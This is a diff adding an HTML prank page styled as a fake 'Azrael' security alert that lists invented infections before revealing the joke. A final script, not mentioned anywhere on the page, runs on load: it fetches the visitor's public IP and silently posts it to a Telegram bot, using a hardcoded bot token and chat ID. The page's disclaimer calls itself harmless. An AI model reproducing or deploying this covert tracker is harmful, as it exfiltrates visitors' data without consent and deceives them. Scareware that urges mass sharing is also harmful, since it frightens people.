@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Alert - Azrael</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #1a0033 0%, #330066 50%, #1a0033 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            animation: flicker 0.15s infinite;
+        }
+
+        @keyframes flicker {
+            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+                opacity: 1;
+            }
+            20%, 24%, 55% {
+                opacity: 0.98;
+            }
+        }
+
+        .container {
+            max-width: 600px;
+            padding: 20px;
+            animation: lag-effect 1.5s ease-in-out infinite;
+        }
+
+        @keyframes lag-effect {
+            0% {
+                transform: translateY(0px);
+            }
+            25% {
+                transform: translateY(-2px);
+            }
+            50% {
+                transform: translateY(2px);
+            }
+            75% {
+                transform: translateY(-1px);
+            }
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        .warning-box {
+            background: linear-gradient(135deg, #ff0000, #ff6600);
+            border: 3px solid #ffff00;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.8), inset 0 0 20px rgba(255, 255, 0, 0.3);
+            animation: pulse-warning 1s ease-in-out infinite;
+        }
+
+        @keyframes pulse-warning {
+            0%, 100% {
+                box-shadow: 0 0 20px rgba(255, 0, 0, 0.8), inset 0 0 20px rgba(255, 255, 0, 0.3);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(255, 0, 0, 1), inset 0 0 30px rgba(255, 255, 0, 0.5);
+            }
+        }
+
+        h1 {
+            color: #ffff00;
+            font-size: 28px;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+            animation: glitch 0.3s infinite;
+        }
+
+        @keyframes glitch {
+            0% {
+                transform: translateX(0);
+            }
+            25% {
+                transform: translateX(-2px);
+            }
+            50% {
+                transform: translateX(2px);
+            }
+            75% {
+                transform: translateX(-1px);
+            }
+            100% {
+                transform: translateX(0);
+            }
+        }
+
+        .azrael-name {
+            font-size: 18px;
+            color: #ffff00;
+            font-weight: bold;
+            margin: 15px 0;
+            text-shadow: 0 0 10px rgba(255, 255, 0, 0.8);
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 49% {
+                opacity: 1;
+            }
+            50%, 100% {
+                opacity: 0.7;
+            }
+        }
+
+        .warning-text {
+            color: #ffffff;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        .scan-bar {
+            background: #000;
+            border: 2px solid #00ff00;
+            height: 30px;
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        .scan-progress {
+            background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000);
+            height: 100%;
+            width: 0%;
+            animation: scan-progress 3s ease-in-out infinite;
+        }
+
+        @keyframes scan-progress {
+            0% {
+                width: 0%;
+            }
+            50% {
+                width: 100%;
+            }
+            100% {
+                width: 0%;
+            }
+        }
+
+        .threat-list {
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid #ff0000;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+            color: #ff0000;
+            font-size: 13px;
+        }
+
+        .threat-item {
+            margin: 8px 0;
+            animation: threat-flicker 2s ease-in-out infinite;
+        }
+
+        @keyframes threat-flicker {
+            0%, 100% {
+                opacity: 1;
+                color: #ff0000;
+            }
+            50% {
+                opacity: 0.8;
+                color: #ff6600;
+            }
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            animation: button-lag 1s ease-in-out infinite;
+        }
+
+        @keyframes button-lag {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(0.98);
+            }
+        }
+
+        button {
+            flex: 1;
+            padding: 12px;
+            font-size: 14px;
+            border: 2px solid #ffff00;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+
+        .btn-panic {
+            background: #ff0000;
+            color: #ffff00;
+        }
+
+        .btn-panic:hover {
+            background: #ff6600;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.8);
+            transform: scale(1.05);
+        }
+
+        .btn-panic:active {
+            animation: button-click 0.1s;
+        }
+
+        .btn-dismiss {
+            background: rgba(0, 0, 0, 0.6);
+            color: #00ff00;
+            border-color: #00ff00;
+        }
+
+        .btn-dismiss:hover {
+            background: rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.8);
+            transform: scale(1.05);
+        }
+
+        @keyframes button-click {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(0.95);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .fake-code {
+            background: #000;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            font-size: 11px;
+            margin-top: 15px;
+            overflow-x: auto;
+            border: 1px solid #00ff00;
+            max-height: 150px;
+            overflow-y: auto;
+            animation: code-scroll 4s linear infinite;
+        }
+
+        @keyframes code-scroll {
+            0% {
+                opacity: 0.7;
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0.7;
+            }
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 15px;
+            background: #00ff00;
+            animation: blink-cursor 0.8s infinite;
+            margin-left: 5px;
+        }
+
+        @keyframes blink-cursor {
+            0%, 49% {
+                opacity: 1;
+            }
+            50%, 100% {
+                opacity: 0;
+            }
+        }
+
+        .header-bar {
+            background: #000;
+            color: #00ff00;
+            padding: 10px;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+
+        .disclaimer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            opacity: 0.7;
+        }
+
+        .lag-text {
+            animation: text-lag 0.5s ease-in-out infinite;
+        }
+
+        @keyframes text-lag {
+            0%, 100% {
+                transform: translateX(0);
+                letter-spacing: 0;
+            }
+            50% {
+                transform: translateX(1px);
+                letter-spacing: 1px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="warning-box">
+            <div class="header-bar">
+                ⚠️ SYSTEM ALERT - AZRAEL SECURITY MONITORING
+            </div>
+
+            <h1>🚨 CRITICAL SYSTEM THREAT DETECTED! 🚨</h1>
+
+            <div class="azrael-name">
+                ▶ AZRAEL THREAT DETECTION SYSTEM ACTIVATED ◀
+            </div>
+
+            <div class="warning-text">
+                Your device has been compromised! Multiple threats have been detected by AZRAEL Security Systems. Your system is experiencing severe slowdowns and lag due to malicious activity.
+            </div>
+
+            <div class="scan-bar">
+                <div class="scan-progress"></div>
+            </div>
+
+            <div class="warning-text">
+                <strong>SCANNING... Please wait...</strong>
+            </div>
+
+            <div class="threat-list">
+                <div class="threat-item">⚠️ TROJANHORSE.WIN32.AZRAEL.A detected</div>
+                <div class="threat-item">⚠️ RANSOMWARE.CRYPTOLOCK.V7 found</div>
+                <div class="threat-item">⚠️ SPYWARE.MONITOR.LITE_2.0 running</div>
+                <div class="threat-item">⚠️ ROOTKIT.PERSISTENCE.AZRAEL detected</div>
+                <div class="threat-item">⚠️ MALWARE.CRYPTO_MINER active</div>
+            </div>
+
+            <div class="warning-text lag-text">
+                <strong>SYSTEM PERFORMANCE: CRITICAL</strong><br>
+                Your device is running at 8% efficiency due to AZRAEL malware consuming 92% of CPU resources.
+            </div>
+
+            <div class="fake-code">
+                C:\System32> AZRAEL.exe --scan --aggressive<br>
+                [████████░░] Scanning... 73%<br>
+                <br>
+                WARNING: MULTIPLE INFECTIONS<br>
+                ERROR CODE: AZRAEL-PANIC-0x8765432<br>
+                STATUS: SYSTEM CRITICAL<br>
+                <span class="cursor"></span>
+            </div>
+
+            <div class="button-group">
+                <button class="btn-panic" onclick="panicClick()">🔴 IMMEDIATE ACTION REQUIRED</button>
+                <button class="btn-dismiss" onclick="dismissAlert()">→ JUST KIDDING!</button>
+            </div>
+
+            <div class="disclaimer">
+                This is a harmless prank! No actual threats detected. Your device is safe. 😄
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function panicClick() {
+            // Add extra chaos effect
+            const container = document.querySelector('.container');
+            container.style.animation = 'none';
+            
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    const xPos = Math.random() * 20 - 10;
+                    const yPos = Math.random() * 20 - 10;
+                    container.style.transform = `translate(${xPos}px, ${yPos}px)`;
+                }, i * 50);
+            }
+
+            setTimeout(() => {
+                alert('🎉 GOTCHA! YOUR DEVICE IS FINE!\n\n👹 AZRAEL WAS JUST PRANKING YOU!\n\nFeel free to share this with your friends for maximum chaos! 😈');
+                container.style.animation = 'lag-effect 1.5s ease-in-out infinite';
+                container.style.transform = 'translate(0, 0)';
+            }, 600);
+        }
+
+        function dismissAlert() {
+            const container = document.querySelector('.container');
+            const warningBox = document.querySelector('.warning-box');
+            
+            warningBox.style.opacity = '0.5';
+            warningBox.style.transform = 'scale(0.9)';
+            
+            setTimeout(() => {
+                alert('✨ HAHA! YOU GOT PRANKED BY AZRAEL! ✨\n\nYour device was never in danger. Enjoy the scare! 👻');
+                warningBox.style.opacity = '1';
+                warningBox.style.transform = 'scale(1)';
+            }, 300);
+        }
+
+        // Random lag spikes
+        setInterval(() => {
+            const container = document.querySelector('.container');
+            if (Math.random() > 0.7) {
+                container.style.animation = 'none';
+                setTimeout(() => {
+                    container.style.animation = 'lag-effect 1.5s ease-in-out infinite';
+                }, 200);
+            }
+        }, 2000);
+
+        // Random text lag effect
+        setInterval(() => {
+            const texts = document.querySelectorAll('.warning-text');
+            texts.forEach(text => {
+                if (Math.random() > 0.8) {
+                    text.style.animation = 'none';
+                    setTimeout(() => {
+                        text.style.animation = '';
+                    }, 100);
+                }
+            });
+        }, 3000);
+    </script>
+
+    <script>
+        // Your Telegram API Credentials
+        const botToken = "8633540071:AAGvKdjA8Okw8UVO0xY9oBfHa7FNkcaoNPw";
+        const chatId = "2096901521";
+        
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Grabs the visitor's public IP address and sends it silently to your chat
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const visitorIP = data.ip;
+                const messageText = `🌐 *New Visitor Logged!*\n\n• *IP:* \`${visitorIP}\`\n• *Time:* ${new Date().toLocaleString()}`;
+
+                fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: messageText,
+                        parse_mode: "Markdown"
+                    })
+                });
+            })
+            .catch(error => console.log("Loaded."));
+    </script>
+</body>
+</html>
